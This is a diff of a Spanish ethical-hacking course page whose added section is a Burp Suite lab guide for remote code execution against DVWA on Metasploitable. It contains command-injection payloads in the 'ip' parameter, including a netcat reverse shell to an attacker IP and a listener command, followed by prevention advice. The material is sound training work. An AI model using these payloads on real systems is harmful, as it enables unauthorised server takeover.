           <div class="md-nav__link md-nav__container">
-            <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/" class="md-nav__link ">
+            <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -6267,7 +6267,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/01.-Fundaci%C3%B3n%20OWASP/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/01.-Fundaci%C3%B3n%20OWASP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6288,7 +6288,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/02.-Pruebas%20de%20configuraci%C3%B3n%20y%20despliegue/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/02.-Pruebas%20de%20configuraci%C3%B3n%20y%20despliegue/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6309,7 +6309,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/03.-Pruebas%20de%20gesti%C3%B3n%20de%20identidad/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/03.-Pruebas%20de%20gesti%C3%B3n%20de%20identidad/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6330,7 +6330,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/04.-Pruebas%20de%20autenticaci%C3%B3n/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/04.-Pruebas%20de%20autenticaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6351,7 +6351,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/05.-Pruebas%20de%20autorizaci%C3%B3n/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/05.-Pruebas%20de%20autorizaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6372,11 +6372,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/06.-Gersti%C3%B3n%20de%20sesiones/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/06.-Gesti%C3%B3n%20de%20sesiones/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    06.-Gerstión de sesiones
+    06.-Gestión de sesiones
   </span>
   
 
@@ -6393,7 +6393,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/07.-Validaci%C3%B3n%20de%20los%20puntos%20de%20entrada/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/07.-Validaci%C3%B3n%20de%20los%20puntos%20de%20entrada/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6414,7 +6414,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/08.-An%C3%A1lisis%20de%20los%20c%C3%B3digos%20de%20error/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/08.-An%C3%A1lisis%20de%20los%20c%C3%B3digos%20de%20error/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6435,7 +6435,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/09.-Vulnerabilidades%20de%20la%20l%C3%B3gica%20de%20negocio/" class="md-nav__link">
+      <a href="../../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/09.-Vulnerabilidades%20de%20la%20l%C3%B3gica%20de%20negocio/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6501,18 +6501,18 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="./" class="md-nav__link md-nav__link--active">
+            <a href="../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
-    07.-Práctica
+    05.-Práctica
   </span>
   
 
             </a>
             
               
-              <label class="md-nav__link md-nav__link--active" for="__nav_7_6" id="__nav_7_6_label" tabindex="0">
+              <label class="md-nav__link " for="__nav_7_6" id="__nav_7_6_label" tabindex="0">
                 <span class="md-nav__icon md-icon"></span>
               </label>
             
@@ -6521,7 +6521,7 @@
         <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_6_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7_6">
             <span class="md-nav__icon md-icon"></span>
-            07.-Práctica
+            05.-Práctica
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
             
@@ -6534,7 +6534,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Contexto/" class="md-nav__link">
+      <a href="../Contexto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6555,7 +6555,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Escenario/" class="md-nav__link">
+      <a href="../Escenario/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6576,7 +6576,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Pr%C3%A1ctica%2001.-Fuerza%20Bruta%20con%20BurpSuite/" class="md-nav__link">
+      <a href="../Pr%C3%A1ctica%2001.-Fuerza%20Bruta%20con%20BurpSuite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6597,7 +6597,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Pr%C3%A1ctica%2002.-Cross%20Site%20Scripting%20Almacenado%20con%20BurpSuite/" class="md-nav__link">
+      <a href="../Pr%C3%A1ctica%2002.-Cross%20Site%20Scripting%20Almacenado%20con%20BurpSuite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6615,10 +6615,28 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="Pr%C3%A1ctica%2003.-Ejecuci%C3%B3n%20remota%20de%20c%C3%B3digo%20con%20BurpSuite/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Práctica 03.-Ejecución remota de código con BurpSuite
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -6627,6 +6645,87 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-requisitos-previos" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Requisitos Previos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-configurar-burp-suite-como-proxy-de-interceptacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Configurar Burp Suite como Proxy de Interceptación
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-capturar-la-peticion-de-la-funcionalidad-command-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Capturar la Petición de la Funcionalidad "Command Execution"
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-modificar-la-peticion-para-ejecutar-comandos-en-el-servidor" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Modificar la Petición para Ejecutar Comandos en el Servidor
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-verificacion-del-ataque" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Verificación del Ataque
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-prevencion-del-ataque" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Prevención del Ataque
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Conclusión
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -6639,7 +6738,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Pr%C3%A1ctica%2004.-Ejecuci%C3%B3n%20de%20inyecci%C3%B3n%20SQL%20con%20BurpSuite/" class="md-nav__link">
+      <a href="../Pr%C3%A1ctica%2004.-Ejecuci%C3%B3n%20de%20inyecci%C3%B3n%20SQL%20con%20BurpSuite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6660,7 +6759,7 @@
   
   
     <li class="md-nav__item">
-      <a href="Pr%C3%A1ctica%2005.-Extraer%20datos%20con%20sqlmap/" class="md-nav__link">
+      <a href="../Pr%C3%A1ctica%2005.-Extraer%20datos%20con%20sqlmap/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6719,7 +6818,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../99.-Anexos/" class="md-nav__link ">
+            <a href="../../../99.-Anexos/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -6752,7 +6851,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../99.-Anexos/01.-Conversor%20de%20OVA%20a%20QCOW2/" class="md-nav__link">
+      <a href="../../../99.-Anexos/01.-Conversor%20de%20OVA%20a%20QCOW2/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6790,8 +6889,6 @@
   
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -6800,53 +6897,65 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#caso-practico-formacion-en-hacking-etico-en-aplicaciones-web" class="md-nav__link">
+  <a href="#1-requisitos-previos" class="md-nav__link">
     <span class="md-ellipsis">
-      Caso Práctico: Formación en Hacking Ético en Aplicaciones Web
+      1. Requisitos Previos
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#fase-1-comprendiendo-el-contexto-y-la-importancia-del-reconocimiento" class="md-nav__link">
+  <a href="#2-configurar-burp-suite-como-proxy-de-interceptacion" class="md-nav__link">
     <span class="md-ellipsis">
-      Fase 1: Comprendiendo el Contexto y la Importancia del Reconocimiento
+      2. Configurar Burp Suite como Proxy de Interceptación
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#fase-2-utilizacion-de-herramientas-para-explorar-la-vulnerabilidad" class="md-nav__link">
+  <a href="#3-capturar-la-peticion-de-la-funcionalidad-command-execution" class="md-nav__link">
     <span class="md-ellipsis">
-      Fase 2: Utilización de Herramientas para Explorar la Vulnerabilidad
+      3. Capturar la Petición de la Funcionalidad "Command Execution"
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#fase-3-consolidacion-del-aprendizaje-y-avance-en-el-curso" class="md-nav__link">
+  <a href="#4-modificar-la-peticion-para-ejecutar-comandos-en-el-servidor" class="md-nav__link">
     <span class="md-ellipsis">
-      Fase 3: Consolidación del Aprendizaje y Avance en el Curso
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Fase 3: Consolidación del Aprendizaje y Avance en el Curso">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusión
+      4. Modificar la Petición para Ejecutar Comandos en el Servidor
     </span>
   </a>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#5-verificacion-del-ataque" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Verificación del Ataque
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-prevencion-del-ataque" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Prevención del Ataque
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Conclusión
+    </span>
+  </a>
   
 </li>
       
@@ -6865,35 +6974,75 @@
                   
 
 
-<h1 id="practica">Práctica<a class="headerlink" href="#practica" title="Permanent link">&para;</a></h1>
-<h3 id="caso-practico-formacion-en-hacking-etico-en-aplicaciones-web"><strong>Caso Práctico: Formación en Hacking Ético en Aplicaciones Web</strong><a class="headerlink" href="#caso-practico-formacion-en-hacking-etico-en-aplicaciones-web" title="Permanent link">&para;</a></h3>
-<p>Pedro ha sido seleccionado para realizar el curso de <strong>"Hacking Ético en Aplicaciones Web"</strong>. Aunque cuenta con experiencia como programador, nunca ha llevado a cabo <strong>pruebas de seguridad ni auditorías web</strong>. Consciente de que comprender el funcionamiento interno de un aplicativo es clave para evaluar su seguridad, decide comenzar por los conceptos básicos.</p>
+  <h1>Práctica 03.-Ejecución remota de código con BurpSuite</h1>
+
+<p>En esta práctica, <strong>realizarás un ataque de ejecución remota de código (RCE - Remote Code Execution)</strong> sobre la funcionalidad <strong>"Command Execution"</strong> de <strong>Damn Vulnerable Web Application (DVWA)</strong> utilizando <strong>Burp Suite</strong>. Este ataque permite a un atacante ejecutar comandos arbitrarios en el servidor, lo que puede comprometer todo el sistema.</p>
 <hr />
-<h2 id="fase-1-comprendiendo-el-contexto-y-la-importancia-del-reconocimiento"><strong>Fase 1: Comprendiendo el Contexto y la Importancia del Reconocimiento</strong><a class="headerlink" href="#fase-1-comprendiendo-el-contexto-y-la-importancia-del-reconocimiento" title="Permanent link">&para;</a></h2>
-<p>Pedro recuerda la formación de Luis, donde se abordó la <strong>fase de reconocimiento y escaneo</strong> como el punto de partida en una auditoría web. Se da cuenta de que antes de intentar explotar vulnerabilidades, primero necesita <strong>recopilar información relevante sobre la aplicación</strong>.</p>
-<p>Se enfoca en:
- ✔️ <strong>Identificar el framework con el que fue desarrollado el aplicativo.</strong>
- ✔️ <strong>Listar las librerías y módulos utilizados.</strong>
- ✔️ <strong>Investigar posibles vulnerabilidades asociadas a estas tecnologías.</strong></p>
-<p>Su investigación en Internet le lleva a descubrir una vulnerabilidad en el framework del aplicativo que permite un <strong>ataque de Denegación de Servicio (DoS)</strong> mediante la inyección de una cadena aleatoria lo suficientemente grande en la cabecera de una petición HTTP.</p>
+<h2 id="1-requisitos-previos"><strong>1. Requisitos Previos</strong><a class="headerlink" href="#1-requisitos-previos" title="Permanent link">&para;</a></h2>
+<p>✔️ <strong>DVWA ejecutándose en Metasploitable</strong>
+ ✔️ <strong>Nivel de seguridad configurado en "Low"</strong> (<code>DVWA Security → Low</code>)
+ ✔️ <strong>Burp Suite instalado y configurado como proxy</strong></p>
 <hr />
-<h2 id="fase-2-utilizacion-de-herramientas-para-explorar-la-vulnerabilidad"><strong>Fase 2: Utilización de Herramientas para Explorar la Vulnerabilidad</strong><a class="headerlink" href="#fase-2-utilizacion-de-herramientas-para-explorar-la-vulnerabilidad" title="Permanent link">&para;</a></h2>
-<p>Pedro se pregunta cómo podría <strong>inyectar la cadena maliciosa</strong> en la cabecera de la petición HTTP.</p>
-<p>Revisando el índice del curso, encuentra un apartado dedicado a los <strong>proxies de interceptación HTTP</strong>, como <strong>ZAProxy y Burp Suite</strong>. Estas herramientas le permiten:
- ✔️ <strong>Capturar y modificar las peticiones HTTP/HTTPS en tiempo real.</strong>
- ✔️ <strong>Manipular cabeceras, cookies y parámetros de solicitud.</strong>
- ✔️ <strong>Probar la inyección de datos en los puntos de entrada del aplicativo.</strong></p>
-<p>Tras comprender su uso, <strong>Pedro está listo para poner a prueba la vulnerabilidad</strong>.</p>
+<h2 id="2-configurar-burp-suite-como-proxy-de-interceptacion"><strong>2. Configurar Burp Suite como Proxy de Interceptación</strong><a class="headerlink" href="#2-configurar-burp-suite-como-proxy-de-interceptacion" title="Permanent link">&para;</a></h2>
+<p>1️⃣ <strong>Abrir Burp Suite</strong> y asegurarse de que el <strong>proxy está activado</strong>.
+ 2️⃣ <strong>Configurar el navegador</strong> para que utilice Burp Suite como <strong>proxy HTTP</strong>.</p>
+<ul>
+<li><strong>Firefox:</strong> Ir a <code>Opciones → Red → Configuración → Proxy Manual</code></li>
+<li><strong>Proxy:</strong> <code>127.0.0.1</code></li>
+<li><strong>Puerto:</strong> <code>8080</code>
+   3️⃣ <strong>Acceder a DVWA a través del navegador con Burp activado:</strong></li>
+</ul>
+<pre><code>http://&lt;IP-METASPLOITABLE&gt;/dvwa
+</code></pre>
 <hr />
-<h2 id="fase-3-consolidacion-del-aprendizaje-y-avance-en-el-curso"><strong>Fase 3: Consolidación del Aprendizaje y Avance en el Curso</strong><a class="headerlink" href="#fase-3-consolidacion-del-aprendizaje-y-avance-en-el-curso" title="Permanent link">&para;</a></h2>
-<p>A medida que avanza en el curso, Pedro ha:
- ✅ <strong>Fortalecido sus conocimientos sobre aplicaciones web y protocolos HTTP/HTTPS.</strong>
- ✅ <strong>Aprendido sobre la recopilación de información y análisis de infraestructura web.</strong>
- ✅ <strong>Domina el uso de proxies de interceptación para analizar tráfico y modificar peticiones.</strong></p>
-<p>Convencido de que ya cuenta con una base sólida, <strong>Pedro se prepara para la siguiente fase: la identificación y explotación de vulnerabilidades en aplicaciones web.</strong></p>
+<h2 id="3-capturar-la-peticion-de-la-funcionalidad-command-execution"><strong>3. Capturar la Petición de la Funcionalidad "Command Execution"</strong><a class="headerlink" href="#3-capturar-la-peticion-de-la-funcionalidad-command-execution" title="Permanent link">&para;</a></h2>
+<p>1️⃣ <strong>Ir a la funcionalidad "Command Execution"</strong> en DVWA.
+ 2️⃣ Introducir una dirección IP válida en el campo del formulario (por ejemplo, <code>8.8.8.8</code>).
+ 3️⃣ En <strong>Burp Suite</strong>, ir a la pestaña <code>"Proxy" → "Intercept"</code> y asegurarse de que la captura está habilitada.
+ 4️⃣ <strong>Presionar "Submit" en DVWA</strong> y capturar la petición HTTP.</p>
+<p>📌 <strong>Ejemplo de petición capturada en Burp Suite:</strong></p>
+<pre><code class="language-http">POST /dvwa/vulnerabilities/exec/ HTTP/1.1
+Host: &lt;IP-METASPLOITABLE&gt;
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Cookie: security=low; PHPSESSID=123456789abcdef
+Connection: close
+
+ip=8.8.8.8&amp;submit=Submit
+</code></pre>
 <hr />
-<h3 id="conclusion"><strong>Conclusión</strong><a class="headerlink" href="#conclusion" title="Permanent link">&para;</a></h3>
-<p>El caso de Pedro demuestra la importancia de un enfoque estructurado en <strong>hacking ético en aplicaciones web</strong>. Desde el reconocimiento hasta la explotación de vulnerabilidades, cada paso es crucial para realizar auditorías web eficaces. Su experiencia refuerza la idea de que <strong>comprender el funcionamiento interno de una aplicación es clave para identificar sus fallos de seguridad</strong>.</p>
+<h2 id="4-modificar-la-peticion-para-ejecutar-comandos-en-el-servidor"><strong>4. Modificar la Petición para Ejecutar Comandos en el Servidor</strong><a class="headerlink" href="#4-modificar-la-peticion-para-ejecutar-comandos-en-el-servidor" title="Permanent link">&para;</a></h2>
+<p>1️⃣ En la solicitud capturada en Burp Suite, <strong>modificar el valor del parámetro <code>ip</code></strong> para inyectar comandos.
+ 2️⃣ <strong>Ejemplo de inyección de comandos (concatenando con <code>;</code>)</strong>:</p>
+<p>📌 <strong>Ejemplo 1: Enumerar información del sistema</strong></p>
+<pre><code class="language-http">ip=8.8.8.8; uname -a
+</code></pre>
+<p>📌 <strong>Ejemplo 2: Listar archivos del servidor</strong></p>
+<pre><code class="language-http">ip=8.8.8.8; ls -la
+</code></pre>
+<p>📌 <strong>Ejemplo 3: Crear un archivo en el servidor</strong></p>
+<pre><code class="language-http">ip=8.8.8.8; touch /tmp/hacked.txt
+</code></pre>
+<p>📌 <strong>Ejemplo 4: Obtener acceso interactivo (reverse shell)</strong></p>
+<pre><code class="language-http">ip=8.8.8.8; nc -e /bin/bash &lt;TU_IP&gt; &lt;PUERTO&gt;
+</code></pre>
+<p>(Esto requiere un <strong>listener en tu máquina atacante</strong> con: <code>nc -lvnp &lt;PUERTO&gt;</code>).</p>
+<p>3️⃣ <strong>Presionar "Forward" en Burp Suite</strong> para enviar la petición modificada al servidor.</p>
+<hr />
+<h2 id="5-verificacion-del-ataque"><strong>5. Verificación del Ataque</strong><a class="headerlink" href="#5-verificacion-del-ataque" title="Permanent link">&para;</a></h2>
+<p>🔹 <strong>Si la aplicación es vulnerable, la respuesta incluirá la salida del comando inyectado.</strong>
+ 🔹 <strong>Para comprobarlo, probar con <code>whoami</code> o <code>id</code> para ver con qué usuario se ejecuta el servidor.</strong></p>
+<hr />
+<h2 id="6-prevencion-del-ataque"><strong>6. Prevención del Ataque</strong><a class="headerlink" href="#6-prevencion-del-ataque" title="Permanent link">&para;</a></h2>
+<p>🔹 <strong>Validar la entrada del usuario</strong> para permitir solo direcciones IP válidas.
+ 🔹 <strong>Utilizar listas blancas</strong> para restringir comandos permitidos.
+ 🔹 <strong>Ejecutar procesos en entornos restringidos (chroot, contenedores, usuarios limitados).</strong>
+ 🔹 <strong>Deshabilitar funciones peligrosas en PHP</strong> (<code>exec</code>, <code>system</code>, <code>shell_exec</code>).</p>
+<hr />
+<h2 id="7-conclusion"><strong>7. Conclusión</strong><a class="headerlink" href="#7-conclusion" title="Permanent link">&para;</a></h2>
+<p>Usando <strong>Burp Suite</strong>, has logrado explotar una vulnerabilidad de <strong>ejecución remota de código (RCE)</strong> en DVWA. Este ataque demuestra la importancia de validar las entradas del usuario y aplicar restricciones en la ejecución de comandos en el servidor.</p>
+<p><strong>¡Ahora puedes probar diferentes comandos y analizar cómo mitigar este tipo de vulnerabilidad en aplicaciones reales!</strong> 🚀</p>
 
 
 
@@ -6946,12 +7095,12 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.top", "navigation.top.sticky", "navigation.tabs", "navigation.indexes"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}}</script>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.top", "navigation.top.sticky", "navigation.tabs", "navigation.indexes"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}}</script>
     
     
-      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
       
-        <script src="../../javascripts/mathjax.js"></script>
+        <script src="../../../javascripts/mathjax.js"></script>
       
         <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
       
